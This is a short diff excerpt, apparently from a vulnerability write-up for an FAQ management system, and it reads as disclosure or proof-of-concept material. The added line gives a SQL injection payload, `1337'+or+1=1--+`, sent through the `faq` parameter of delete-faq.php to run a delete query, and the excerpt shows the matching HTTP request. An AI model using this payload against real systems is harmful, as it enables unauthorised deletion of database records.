@@ -40,6 +40,8 @@ if (isset($_GET['faq'])) {
 
 ![image](https://github.com/smurf-reigz/security/assets/48426940/9727f7a4-b6ee-4f4b-b570-98dad4f579de)
 
+Execute Delete query using payload `1337'+or+1=1--+` via the `faq` parameter.
+
 ```http 
 GET /faq-management-system/endpoint/delete-faq.php?faq=1337'+or+1=1--+ HTTP/1.1
 Host: localhost
